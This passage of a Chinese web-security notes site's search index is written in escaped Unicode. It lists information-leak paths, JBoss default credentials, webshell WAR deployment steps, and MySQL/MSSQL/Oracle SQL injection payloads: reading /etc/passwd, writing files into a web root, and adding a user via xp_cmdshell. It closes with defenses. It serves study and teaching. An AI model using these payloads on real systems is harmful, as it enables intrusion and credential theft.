WEB-INF/src/\uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2ajava\u6587\u4ef6 # WEB-INF/database.properties\uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6 server-status\uff1aTomcat\u670d\u52a1\u5668\u72b6\u6001 phpmyadmin\uff1aMySQL\u6570\u636e\u5e93web\u7ba1\u7406\u754c\u9762 http\u8ba4\u8bc1\u9875\u9762 \u4ee3\u7801\u7ba1\u7406\u5de5\u5177\u7684\u9ed8\u8ba4\u76ee\u5f55 svn\uff1a.svn/entries\uff08https://github.com/kost/dvcs-ripper\uff09 git\uff1a.git/config\uff08https://github.com/kost/dvcs-ripper\uff09 hg\uff1a.hg\uff08https://github.com/kost/dvcs-ripper\uff09 cvs\uff1aCVS/entries\uff08https://github.com/kost/dvcs-ripper\uff09 bzr\uff1a.bzr\uff08https://github.com/kost/dvcs-ripper\uff09 DS_Store\uff1a.DS_Store\uff08https://github.com/lijiejie/ds_store_exp\uff09 \u5e38\u7528\u7684\u5907\u4efd\u6587\u4ef6\u540e\u7f00 rar\u3001zip\u30017z\u3001tar\u3001gz\u3001tar.gz\u3001bak\u3001backup\u3001swp\u3001old\u3001txt\u3001doc/docx\u7b49\u7b49 \u76ee\u5f55\u904d\u5386 \u7ba1\u7406\u540e\u53f0 \u9690\u85cf\u8f83\u6df1\u7684\u76ee\u5f55\uff1b \u5176\u4ed6\u7aef\u53e3\u4e0a\u7684\u7ba1\u7406\u540e\u53f0\uff1b \u9519\u8bef\u4fe1\u606f\u8be6\u60c5 \u670d\u52a1\u5668\u7248\u672c\u4fe1\u606f\uff1b \u4e2d\u95f4\u4ef6\u4fe1\u606f\uff1b \u670d\u52a1\u5668web\u76ee\u5f55\u5730\u5740 JS\u654f\u611f\u4fe1\u606f\u6cc4\u6f0f JS\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff1a\u4e0d\u5bb9\u5ffd\u89c6\u7684WEB\u6f0f\u6d1e JS\u6587\u4ef6\u6cc4\u6f0f\u540e\u53f0\u7ba1\u7406\u654f\u611f\u8def\u5f84\u53caAPI\uff1b \u9875\u9762\u5185JS\u6cc4\u6f0fhttp-only\u4fdd\u62a4\u7684cookie\uff1b \u9875\u9762\u5185JS\u4ee5\u53caAjax\u8bf7\u6c42\u6cc4\u6f0f\u7528\u6237\u654f\u611f\u4fe1\u606f\uff1b \u4ee3\u7801\u5f00\u653e\u5e73\u53f0\u6216\u7f51\u76d8\u4fe1\u606f\u6cc4\u6f0f \u4ee3\u7801\u5f00\u653e\u5e73\u53f0\uff1aGitHub\u3001\u7801\u4e91 \u7f51\u76d8\uff1a U\u76d8\uff1a \u5728\u7ebf\u7b14\u8bb0\uff1a\u5370\u8c61\u3001\u6709\u9053\u4e91","title":"\u4fe1\u606f\u6cc4\u6f0f"},{"location":"vulnerability/information_leakage/#_1","text":"","title":"\u4fe1\u606f\u6cc4\u6f0f"},{"location":"vulnerability/information_leakage/#_2","text":"","title":"\u5e38\u89c1\u7684\u4fe1\u606f\u6cc4\u6f0f\u9879"},{"location":"vulnerability/information_leakage/#_3","text":"phpinfo()\uff1aphp\u7684\u6d4b\u8bd5\u6587\u4ef6 test.cgi\uff1acgi\u6d4b\u8bd5\u6587\u4ef6 WEB-INF\u6cc4\u6f0f\uff1ajava web\u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55 # WEB-INF/web.xml\uff1a\u5982\u679c\u60f3\u8981\u5728\u9875\u9762\u4e2d\u76f4\u63a5\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\uff0c\u5fc5\u987b\u901a\u8fc7web.xml\u6587\u4ef6\u5bf9\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u8fdb\u884c\u76f8\u5e94\u6620\u5c04\u624d\u80fd\u8bbf\u95ee # WEB-INF/classes/\uff1a\u5305\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7684class\u6587\u4ef6\uff0c\u5305\u62ecservlet class\u548c\u975eservlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728.jar\u6587\u4ef6\u4e2d # WEB-INF/lib/\uff1a\u5b58\u653eweb\u5e94\u7528\u6240\u9700\u7684\u5404\u79cdjar\u6587\u4ef6\uff0c\u5982\uff1a\u6570\u636e\u5e93\u9a71\u52a8jar\u6587\u4ef6 # WEB-INF/src/\uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2ajava\u6587\u4ef6 # WEB-INF/database.properties\uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6 server-status\uff1aTomcat\u670d\u52a1\u5668\u72b6\u6001 phpmyadmin\uff1aMySQL\u6570\u636e\u5e93web\u7ba1\u7406\u754c\u9762 http\u8ba4\u8bc1\u9875\u9762","title":"\u9ed8\u8ba4\u4e0e\u6d4b\u8bd5\u9875\u9762"},{"location":"vulnerability/information_leakage/#_4","text":"svn\uff1a.svn/entries\uff08https://github.com/kost/dvcs-ripper\uff09 git\uff1a.git/config\uff08https://github.com/kost/dvcs-ripper\uff09 hg\uff1a.hg\uff08https://github.com/kost/dvcs-ripper\uff09 cvs\uff1aCVS/entries\uff08https://github.com/kost/dvcs-ripper\uff09 bzr\uff1a.bzr\uff08https://github.com/kost/dvcs-ripper\uff09 DS_Store\uff1a.DS_Store\uff08https://github.com/lijiejie/ds_store_exp\uff09","title":"\u4ee3\u7801\u7ba1\u7406\u5de5\u5177\u7684\u9ed8\u8ba4\u76ee\u5f55"},{"location":"vulnerability/information_leakage/#_5","text":"rar\u3001zip\u30017z\u3001tar\u3001gz\u3001tar.gz\u3001bak\u3001backup\u3001swp\u3001old\u3001txt\u3001doc/docx\u7b49\u7b49","title":"\u5e38\u7528\u7684\u5907\u4efd\u6587\u4ef6\u540e\u7f00"},{"location":"vulnerability/information_leakage/#_6","text":"","title":"\u76ee\u5f55\u904d\u5386"},{"location":"vulnerability/information_leakage/#_7","text":"\u9690\u85cf\u8f83\u6df1\u7684\u76ee\u5f55\uff1b \u5176\u4ed6\u7aef\u53e3\u4e0a\u7684\u7ba1\u7406\u540e\u53f0\uff1b","title":"\u7ba1\u7406\u540e\u53f0"},{"location":"vulnerability/information_leakage/#_8","text":"\u670d\u52a1\u5668\u7248\u672c\u4fe1\u606f\uff1b \u4e2d\u95f4\u4ef6\u4fe1\u606f\uff1b \u670d\u52a1\u5668web\u76ee\u5f55\u5730\u5740","title":"\u9519\u8bef\u4fe1\u606f\u8be6\u60c5"},{"location":"vulnerability/information_leakage/#js","text":"JS\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff1a\u4e0d\u5bb9\u5ffd\u89c6\u7684WEB\u6f0f\u6d1e JS\u6587\u4ef6\u6cc4\u6f0f\u540e\u53f0\u7ba1\u7406\u654f\u611f\u8def\u5f84\u53caAPI\uff1b \u9875\u9762\u5185JS\u6cc4\u6f0fhttp-only\u4fdd\u62a4\u7684cookie\uff1b \u9875\u9762\u5185JS\u4ee5\u53caAjax\u8bf7\u6c42\u6cc4\u6f0f\u7528\u6237\u654f\u611f\u4fe1\u606f\uff1b","title":"JS\u654f\u611f\u4fe1\u606f\u6cc4\u6f0f"},{"location":"vulnerability/information_leakage/#_9","text":"\u4ee3\u7801\u5f00\u653e\u5e73\u53f0\uff1aGitHub\u3001\u7801\u4e91 \u7f51\u76d8\uff1a U\u76d8\uff1a \u5728\u7ebf\u7b14\u8bb0\uff1a\u5370\u8c61\u3001\u6709\u9053\u4e91","title":"\u4ee3\u7801\u5f00\u653e\u5e73\u53f0\u6216\u7f51\u76d8\u4fe1\u606f\u6cc4\u6f0f"},{"location":"vulnerability/jboss/","text":"JBoss\u6f0f\u6d1e\u603b\u7ed3 JBoss\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 jmx-console\uff1aadmin/admin\u3001jboss/jboss admin-console\uff1aadmin/admin\u3001jboss/jboss \u540e\u53f0\u90e8\u7f72war\u5305GetShell \u8fdb\u5165jmx-console\u540e\u53f0\uff1b \u627e\u5230jboss.deployment\uff0c\u70b9\u51fbflavor=URL,type=DeploymentScanner\uff1b \u627e\u5230void.addURL()\uff0c\u5728\u8f93\u5165\u6846\u4e2d\u5199\u5165\u4e00\u4e2awar\u5305\u5730\u5740\uff0cwar\u5305\u5305\u542b\u4e00\u4e2awebshell\uff1b \u70b9\u51fbinvoke\u83b7\u53d6\u4e00\u4e2ajsp\u7684webshell\u5730\u5740\uff1b \u4fee\u590d\u65b9\u6848 JBoss JMX \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4\u6f0f\u6d1e JBoss\u53cd\u5e8f\u5217\u5316 \u53cd\u5e8f\u5217\u5316\u4e3b\u8981\u5f71\u54cdJBoss5.x\u548cJBoss6.x","title":"JBoss\u6f0f\u6d1e\u603b\u7ed3"},{"location":"vulnerability/jboss/#jboss","text":"","title":"JBoss\u6f0f\u6d1e\u603b\u7ed3"},{"location":"vulnerability/jboss/#jboss_1","text":"jmx-console\uff1aadmin/admin\u3001jboss/jboss admin-console\uff1aadmin/admin\u3001jboss/jboss","title":"JBoss\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4"},{"location":"vulnerability/jboss/#wargetshell","text":"\u8fdb\u5165jmx-console\u540e\u53f0\uff1b \u627e\u5230jboss.deployment\uff0c\u70b9\u51fbflavor=URL,type=DeploymentScanner\uff1b \u627e\u5230void.addURL()\uff0c\u5728\u8f93\u5165\u6846\u4e2d\u5199\u5165\u4e00\u4e2awar\u5305\u5730\u5740\uff0cwar\u5305\u5305\u542b\u4e00\u4e2awebshell\uff1b \u70b9\u51fbinvoke\u83b7\u53d6\u4e00\u4e2ajsp\u7684webshell\u5730\u5740\uff1b","title":"\u540e\u53f0\u90e8\u7f72war\u5305GetShell"},{"location":"vulnerability/jboss/#_1","text":"JBoss JMX \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4\u6f0f\u6d1e","title":"\u4fee\u590d\u65b9\u6848"},{"location":"vulnerability/jboss/#jboss_2","text":"\u53cd\u5e8f\u5217\u5316\u4e3b\u8981\u5f71\u54cdJBoss5.x\u548cJBoss6.x","title":"JBoss\u53cd\u5e8f\u5217\u5316"},{"location":"vulnerability/sql_injection/","text":"SQL\u6ce8\u5165 MySQL\u6ce8\u5165\u8be6\u89e3 \u83b7\u53d6\u6570\u636e \u6ce8\u91ca\u7b26 #:\u6ce8\u91ca\u4ece#\u7b26\u53f7\u5230\u884c\u5c3e --:\u6ce8\u91ca\u4ece--\u7b26\u53f7\u5230\u884c\u5c3e /* */:\u6ce8\u91ca\u7b26\u53f7\u4e2d\u95f4 \u83b7\u53d6\u5143\u6570\u636e -- \u67e5\u8be2\u7528\u6237\u6570\u636e\u5e93\u540d\u79f0 select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA limit 0,1; -- \u67e5\u8be2\u5f53\u524d\u8868 select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=(select DATABASE()) limit 0,1; -- \u67e5\u8be2\u8868\u4e2d\u7684\u5b57\u6bb5 select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME= table_name limit 0,1; union\u67e5\u8be2 select user,pass from bloodzer0 union select 1,2; MySQL\u62a5\u9519\u6ce8\u5165 -- \u5229\u7528\u9519\u8bef\u4fe1\u606f select convert((select @@version),signed); -- updatexml\u51fd\u6570 select * from bloodzer0 where id=1 and updatexml(1,(concat(0x7c,(select @@user()))),1); -- extractvalue\u51fd\u6570 select * from bloodzer0 where id=1 and extractvalue(1,concat(0x7c,(select user()))); -- \u901a\u8fc7floor\u51fd\u6570(\u4e5f\u5c31\u662f\u5e38\u8bf4\u7684\u53cc\u67e5\u8be2\u6ce8\u5165) select * from bloodzer0 where id=1 union select * from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b; MySQL\u51fd\u6570 load_file() select 1,load_file('/etc/passwd'),3; select 1,load_file(0x2f6574632f706173737764),3; select hex(load_file(char(47,101,99,116,47,112,97,115,115,119,100))),3; into outfile select ' ?php phpinfo();? ' into outfile '/var/www/html/info.php'; select char(99,58,92,50,46,116,120,116) into outfile '/var/www/html/info.php'; \u8fde\u63a5\u5b57\u7b26\u4e32 select * from bloodzer0 where id=1 union select concat(user(),',',database()); select * from bloodzer0 where id=1 union select concat_ws(0x2c,user(),database()); \u5176\u5b83\u51fd\u6570 \u51fd\u6570\u540d \u4f5c\u7528 length \u8fd4\u56de\u5b57\u7b26\u4e32\u957f\u5ea6 substring \u622a\u53d6\u5b57\u7b26\u4e32\u957f\u5ea6 ascii \u8fd4\u56deASCII\u7801 hex \u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236 unhex hex\u7684\u53cd\u5411\u64cd\u4f5c now \u5f53\u524d\u7cfb\u7edf\u65f6\u95f4 floor(X) \u8fd4\u56de\u4e0d\u5927\u4e8eX\u7684\u6700\u5927\u6574\u6570\u503c md5 \u8fd4\u56deMD5\u503c group_concat \u8fd4\u56de\u5e26\u6709\u6765\u81ea\u4e00\u4e2a\u7ec4\u7684\u8fde\u63a5\u7684\u975eNULL\u7684\u5b57\u7b26\u4e32\u7ed3\u679c @@datadir \u8bfb\u53d6\u6570\u636e\u5e93\u8def\u5f84 @@basedir MySQL\u5b89\u88c5\u8def\u5f84 @@version_compile_os \u64cd\u4f5c\u7cfb\u7edf user \u7528\u6237\u540d current_user \u5f53\u524d\u7528\u6237\u540d system_user \u7cfb\u7edf\u7528\u6237\u540d database \u5f53\u524d\u6570\u636e\u5e93 version \u5f53\u524d\u6570\u636e\u5e93\u7248\u672c\u4fe1\u606f MySQL\u5bbd\u5b57\u8282\u6ce8\u5165 \u7f16\u7801\u4e0d\u7edf\u4e00\u9020\u6210\uff0c\u4e00\u822c\u53ea\u51fa\u73b0\u5728PHP+MySQL\u4e2d\uff1b magic_quotes_gps=On # \u7f16\u7801\uff1a%d5 MySQL\u957f\u5b57\u7b26\u622a\u65ad MySQL\u7248\u672c=5.1 \u5e76\u4e14 sql_mode=default MySQL\u5bf9\u4e8e\u63d2\u5165\u8d85\u8fc7\u539f\u672c\u9650\u5236\u957f\u5ea6\u7684\u503c\u53ea\u4f1a\u63d0\u793awarning\uff0c\u800c\u4e0d\u662ferror\uff0c\u51fa\u73b0\u5728web\u6f0f\u6d1e\u4e2d\u7684\u8986\u76d6\u6ce8\u518c\u4e2d\u3002 MySQL\u76f2\u6ce8 -- \u57fa\u4e8e\u65f6\u95f4 select * from users where id=1 and sleep(3); select * from users where id=1 and if(length(user())=0,sleep(3),1); select * from users where id=1 and if(hex(mid(users(),1,1))=1,sleep(3),1); MSSQL\u6ce8\u5165\u8be6\u89e3 \u83b7\u53d6\u6570\u636e \u5229\u7528\u9519\u8bef\u4fe1\u606f\u63d0\u53d6\u6570\u636e -- \u679a\u4e3e\u8868\u4e0e\u5217 select * from users where username='root' and password='root' having 1=1 --'; select * from users where username='root' and password='root' group by users.id having 1=1 --'; -- \u5229\u7528\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u63d0\u53d6\u6570\u636e select * from users where username='root' and password='root' and 1 (select top 1 username from users); select * from users where username='root' and password='root' and 1=conver(int,(select top 1 users.username from users)); \u83b7\u53d6\u5143\u6570\u636e -- \u83b7\u53d6\u8868\u4fe1\u606f select table_name from information_schema.tables; -- \u83b7\u53d6\u5b57\u6bb5\u4fe1\u606f select column_name from information_schema.columns where table_name='users'; MSSQL\u6570\u636e\u5e93\u89c6\u56fe \u4f5c\u7528 sys.database SQL Server\u4e2d\u7684\u6240\u6709\u6570\u636e\u5e93 sys.sql_logins SQL Server\u4e2d\u7684\u6240\u6709\u767b\u5f55\u540d information_schema.tables \u5f53\u524d\u7528\u6237\u6570\u636e\u5e93\u4e2d\u7684\u8868 information_schema.columns \u5f53\u524d\u7528\u6237\u6570\u636e\u5e93\u4e2d\u7684\u5217 sys.all_columns \u7528\u6237\u5b9a\u4e49\u5bf9\u8c61\u548c\u7cfb\u7edf\u5bf9\u8c61\u7684\u6240\u6709\u5217\u7684\u8054\u5408 sys.database_principals \u6570\u636e\u5e93\u4e2d\u6bcf\u4e2a\u6743\u9650\u6216\u5217\u5f02\u5e38\u6743\u9650 sys.database_files \u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u5e93\u6587\u4ef6 sysobjects \u6570\u636e\u5e93\u4e2d\u521b\u5efa\u7684\u6bcf\u4e2a\u5bf9\u8c61 order by\u5b50\u53e5 -- \u6d4b\u8bd5\u5b57\u6bb5 select id,username,password from users where id=1 order by num; union\u67e5\u8be2 select id,username,password from users where id=1 union select 1,2,3; select id,username,password from users where id=1 union select user from users; MSSQL\u51fd\u6570 \u51fd\u6570\u540d \u4f5c\u7528 select suser_name() \u8fd4\u56de\u7528\u6237\u7684\u767b\u5f55\u6807\u8bc6\u540d select user_name() \u57fa\u4e8e\u6307\u5b9a\u7684\u6807\u8bc6\u53f7\u8fd4\u56de\u6570\u636e\u5e93\u7528\u6237\u540d select db_name() \u8fd4\u56de\u6570\u636e\u5e93\u540d\u79f0 select is_member('db_owner') \u662f\u5426\u4e3a\u6570\u636e\u5e93\u89d2\u8272 select convert(int,'5') \u6570\u636e\u5e93\u7c7b\u578b\u8f6c\u6362 stuff \u5b57\u7b26\u4e32\u622a\u53d6\u51fd\u6570 ascii \u53d6ascii\u7801 char \u6839\u636eascii\u7801\u53d6\u5b57\u7b26 getdate \u8fd4\u56de\u65e5\u671f count \u8fd4\u56de\u7ec4\u4e2d\u7684\u603b\u6761\u6570 cast \u5c06\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u7684\u8868\u8fbe\u5f0f\u663e\u5f0f\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u7684\u8868\u8fbe\u5f0f rand \u8fd4\u56de\u968f\u673a\u503c is_srvrolemember \u6307\u793aSQL Server\u767b\u5f55\u540d\u662f\u5426\u4e3a\u6307\u5b9a\u670d\u52a1\u5668\u89d2\u8272\u7684\u6210\u5458 MSSQL\u5b58\u50a8\u8fc7\u7a0b select * from users where id=1; exec xp_cmdshell 'net user hacker hacker /add'; \u5b58\u50a8\u8fc7\u7a0b \u4f5c\u7528 sp_addlogin \u521b\u5efa\u65b0\u7684SQL Server\u767b\u5f55\uff0c\u8be5\u767b\u5f55\u5141\u8bb8\u7528\u6237\u4f7f\u7528SQL Server\u8eab\u4efd\u9a8c\u8bc1\u8fde\u63a5\u5230SQL Server\u5b9e\u4f8b sp_dropuser \u4ece\u5f53\u524d\u6570\u636e\u5e93\u5220\u9664\u6570\u636e\u5e93\u7528\u6237 xp_enumgroups \u63d0\u4f9bMicrosoft Windows\u672c\u5730\u7ec4\u5217\u8868\u6216\u5728\u6307\u5b9a\u7684Windows\u57df\u4e2d\u5b9a\u4e49\u5168\u5c40\u7ec4\u5217\u8868 xp_regwrite \u672a\u88ab\u516c\u5e03\u7684\u5b58\u50a8\u8fc7\u7a0b\uff0c\u5199\u5165\u6ce8\u518c\u8868 xp_regread \u8bfb\u53d6\u6ce8\u518c\u8868 xp_regdeletevalue \u5220\u9664\u6ce8\u518c\u8868 xp_dirtree \u8bfb\u53d6\u76ee\u5f55 sp_password \u66f4\u6539\u5bc6\u7801 xp_servicecontrol \u505c\u6b62\u6216\u6fc0\u6d3b\u67d0\u670d\u52a1 MSSQL\u52a8\u6001\u6267\u884c exec\u51fd\u6570\uff1a Oracle\u6ce8\u5165\u8be6\u89e3 \u83b7\u53d6\u6570\u636e \u83b7\u53d6\u5143\u6570\u636e -- \u67e5\u770b\u8868\u7a7a\u95f4 select tablespace_name from user_tablespaces; -- \u67e5\u770b\u6240\u6709\u8868 select table_name from user_tables where rownum=1; -- \u67e5\u770b\u6240\u6709\u5217 select column_name from user_tab_columns where table_name='tab_name'; -- \u67e5\u770b\u6240\u6709\u7528\u6237 select username from all_users; union\u67e5\u8be2 union select null,null,null from dual; Oracle\u5305\u6982\u5ff5 \u9632\u5fa1\u624b\u6bb5 \u8f93\u5165\u8fc7\u6ee4 \u68c0\u67e5\u6570\u636e\u7c7b\u578b \u4f7f\u7528\u5b89\u5168\u7684\u51fd\u6570 \u4f7f\u7528\u9884\u7f16\u8bd1 \u9632\u5fa1SQL\u6ce8\u5165\u6700\u4f73\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528\u9884\u7f16\u8bd1\u8bed\u53e5\uff0c\u7ed1\u5b9a\u53d8\u91cf\u3002 \u4f7f\u7528\u5b89\u5168\u7684\u5b58\u50a8\u8fc7\u7a0b \u5b58\u50a8\u8fc7\u7a0b\u4e0e\u9884\u7f16\u8bd1\u7684\u533a\u522b\uff1a\u5b58\u50a8\u8fc7\u7a0b\u9700\u8981\u5148\u5c06SQL\u8bed\u53e5\u5b9a\u4e49\u5728\u6570\u636e\u5e93\u4e2d\u3002 \u7ed5\u8fc7\u5b58\u50a8\u8fc7\u7a0b \u5b58\u50a8\u8fc7\u7a0b\u5b58\u5728\u88ab\u7ed5\u8fc7\u7684\u53ef\u80fd\u6027\uff1a\u52a8\u6001\u7684SQL\u3001\u5982\uff1axp_cmdshell \u4f7f\u7528\u6846\u67b6\u6280\u672f","title":"SQL\u6ce8\u5165"},{"location":"vulnerability/sql_injection/#sql","text":"","title":"SQL\u6ce8\u5165"},{"location":"vulnerability/sql_injection/#mysql","text":"","title":"MySQL\u6ce8\u5165\u8be6\u89e3"},{"location":"vulnerability/sql_injection/#_1","text":"","title":"\u83b7\u53d6\u6570\u636e"},{"location":"vulnerability/sql_injection/#_2","text":"#:\u6ce8\u91ca\u4ece#\u7b26\u53f7\u5230\u884c\u5c3e --:\u6ce8\u91ca\u4ece--\u7b26\u53f7\u5230\u884c\u5c3e /* */:\u6ce8\u91ca\u7b26\u53f7\u4e2d\u95f4","title":"\u6ce8\u91ca\u7b26"},{"location":"vulnerability/sql_injection/#_3","text":"-- \u67e5\u8be2\u7528\u6237\u6570\u636e\u5e93\u540d\u79f0 select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA limit 0,1; -- \u67e5\u8be2\u5f53\u524d\u8868 select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=(select DATABASE()) limit 0,1; -- \u67e5\u8be2\u8868\u4e2d\u7684\u5b57\u6bb5 select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME= table_name limit 0,1;","title":"\u83b7\u53d6\u5143\u6570\u636e"},{"location":"vulnerability/sql_injection/#union","text":"select user,pass from bloodzer0 union select 1,2;","title":"union\u67e5\u8be2"},{"location":"vulnerability/sql_injection/#mysql_1","text":"-- \u5229\u7528\u9519\u8bef\u4fe1\u606f select convert((select @@version),signed); -- updatexml\u51fd\u6570 select * from bloodzer0 where id=1 and updatexml(1,(concat(0x7c,(select @@user()))),1); -- extractvalue\u51fd\u6570 select * from bloodzer0 where id=1 and extractvalue(1,concat(0x7c,(select user()))); -- \u901a\u8fc7floor\u51fd\u6570(\u4e5f\u5c31\u662f\u5e38\u8bf4\u7684\u53cc\u67e5\u8be2\u6ce8\u5165) select * from bloodzer0 where id=1 union select * from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b;","title":"MySQL\u62a5\u9519\u6ce8\u5165"},{"location":"vulnerability/sql_injection/#mysql_2","text":"","title":"MySQL\u51fd\u6570"},{"location":"vulnerability/sql_injection/#load_file","text":"select 1,load_file('/etc/passwd'),3; select 1,load_file(0x2f6574632f706173737764),3; select hex(load_file(char(47,101,99,116,47,112,97,115,115,119,100))),3;","title":"load_file()"},{"location":"vulnerability/sql_injection/#into-outfile","text":"select ' ?php phpinfo();? ' into outfile '/var/www/html/info.php'; select char(99,58,92,50,46,116,120,116) into outfile '/var/www/html/info.php';","title":"into outfile"},{"location":"vulnerability/sql_injection/#_4","text":"select * from bloodzer0 where id=1 union select concat(user(),',',database()); select * from bloodzer0 where id=1 union select concat_ws(0x2c,user(),database());","title":"\u8fde\u63a5\u5b57\u7b26\u4e32"},{"location":"vulnerability/sql_injection/#_5","text":"\u51fd\u6570\u540d \u4f5c\u7528 length \u8fd4\u56de\u5b57\u7b26\u4e32\u957f\u5ea6 substring \u622a\u53d6\u5b57\u7b26\u4e32\u957f\u5ea6 ascii \u8fd4\u56deASCII\u7801 hex \u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236 unhex hex\u7684\u53cd\u5411\u64cd\u4f5c now \u5f53\u524d\u7cfb\u7edf\u65f6\u95f4 floor(X) \u8fd4\u56de\u4e0d\u5927\u4e8eX\u7684\u6700\u5927\u6574\u6570\u503c md5 \u8fd4\u56deMD5\u503c group_concat \u8fd4\u56de\u5e26\u6709\u6765\u81ea\u4e00\u4e2a\u7ec4\u7684\u8fde\u63a5\u7684\u975eNULL\u7684\u5b57\u7b26\u4e32\u7ed3\u679c @@datadir \u8bfb\u53d6\u6570\u636e\u5e93\u8def\u5f84 @@basedir MySQL\u5b89\u88c5\u8def\u5f84 @@version_compile_os \u64cd\u4f5c\u7cfb\u7edf user \u7528\u6237\u540d current_user \u5f53\u524d\u7528\u6237\u540d system_user \u7cfb\u7edf\u7528\u6237\u540d database \u5f53\u524d\u6570\u636e\u5e93 version \u5f53\u524d\u6570\u636e\u5e93\u7248\u672c\u4fe1\u606f","title":"\u5176\u5b83\u51fd\u6570"},{"location":"vulnerability/sql_injection/#mysql_3","text":"\u7f16\u7801\u4e0d\u7edf\u4e00\u9020\u6210\uff0c\u4e00\u822c\u53ea\u51fa\u73b0\u5728PHP+MySQL\u4e2d\uff1b magic_quotes_gps=On # \u7f16\u7801\uff1a%d5","title":"MySQL\u5bbd\u5b57\u8282\u6ce8\u5165"},{"location":"vulnerability/sql_injection/#mysql_4","text":"MySQL\u7248\u672c=5.1 \u5e76\u4e14 sql_mode=default MySQL\u5bf9\u4e8e\u63d2\u5165\u8d85\u8fc7\u539f\u672c\u9650\u5236\u957f\u5ea6\u7684\u503c\u53ea\u4f1a\u63d0\u793awarning\uff0c\u800c\u4e0d\u662ferror\uff0c\u51fa\u73b0\u5728web\u6f0f\u6d1e\u4e2d\u7684\u8986\u76d6\u6ce8\u518c\u4e2d\u3002","title":"MySQL\u957f\u5b57\u7b26\u622a\u65ad"},{"location":"vulnerability/sql_injection/#mysql_5","text":"-- \u57fa\u4e8e\u65f6\u95f4 select * from users where id=1 and sleep(3); select * from users where id=1 and if(length(user())=0,sleep(3),1); select * from users where id=1 and if(hex(mid(users(),1,1))=1,sleep(3),1);","title":"MySQL\u76f2\u6ce8"},{"location":"vulnerability/sql_injection/#mssql","text":"","title":"MSSQL\u6ce8\u5165\u8be6\u89e3"},{"location":"vulnerability/sql_injection/#_6","text":"","title":"\u83b7\u53d6\u6570\u636e"},{"location":"vulnerability/sql_injection/#_7","text":"-- \u679a\u4e3e\u8868\u4e0e\u5217 select * from users where username='root' and password='root' having 1=1 --'; select * from users where username='root' and password='root' group by users.id having 1=1 --'; -- \u5229\u7528\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u63d0\u53d6\u6570\u636e select * from users where username='root' and password='root' and 1 (select top 1 username from users); select * from users where username='root' and password='root' and 1=conver(int,(select top 1 users.username from users));","title":"\u5229\u7528\u9519\u8bef\u4fe1\u606f\u63d0\u53d6\u6570\u636e"},{"location":"vulnerability/sql_injection/#_8","text":"-- \u83b7\u53d6\u8868\u4fe1\u606f select table_name from information_schema.tables; -- \u83b7\u53d6\u5b57\u6bb5\u4fe1\u606f select column_name from information_schema.columns where table_name='users'; MSSQL\u6570\u636e\u5e93\u89c6\u56fe \u4f5c\u7528 sys.database SQL Server\u4e2d\u7684\u6240\u6709\u6570\u636e\u5e93 sys.sql_logins SQL Server\u4e2d\u7684\u6240\u6709\u767b\u5f55\u540d information_schema.tables \u5f53\u524d\u7528\u6237\u6570\u636e\u5e93\u4e2d\u7684\u8868 information_schema.columns \u5f53\u524d\u7528\u6237\u6570\u636e\u5e93\u4e2d\u7684\u5217 sys.all_columns \u7528\u6237\u5b9a\u4e49\u5bf9\u8c61\u548c\u7cfb\u7edf\u5bf9\u8c61\u7684\u6240\u6709\u5217\u7684\u8054\u5408 sys.database_principals \u6570\u636e\u5e93\u4e2d\u6bcf\u4e2a\u6743\u9650\u6216\u5217\u5f02\u5e38\u6743\u9650 sys.database_files \u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u5e93\u6587\u4ef6 sysobjects \u6570\u636e\u5e93\u4e2d\u521b\u5efa\u7684\u6bcf\u4e2a\u5bf9\u8c61","title":"\u83b7\u53d6\u5143\u6570\u636e"},{"location":"vulnerability/sql_injection/#order-by","text":"-- \u6d4b\u8bd5\u5b57\u6bb5 select id,username,password from users where id=1 order by num;","title":"order by\u5b50\u53e5"},{"location":"vulnerability/sql_injection/#union_1","text":"select id,username,password from users where id=1 union select 1,2,3; select id,username,password from users where id=1 union select user from users;","title":"union\u67e5\u8be2"},{"location":"vulnerability/sql_injection/#mssql_1","text":"\u51fd\u6570\u540d \u4f5c\u7528 select suser_name() \u8fd4\u56de\u7528\u6237\u7684\u767b\u5f55\u6807\u8bc6\u540d select user_name() \u57fa\u4e8e\u6307\u5b9a\u7684\u6807\u8bc6\u53f7\u8fd4\u56de\u6570\u636e\u5e93\u7528\u6237\u540d select db_name() \u8fd4\u56de\u6570\u636e\u5e93\u540d\u79f0 select is_member('db_owner') \u662f\u5426\u4e3a\u6570\u636e\u5e93\u89d2\u8272 select 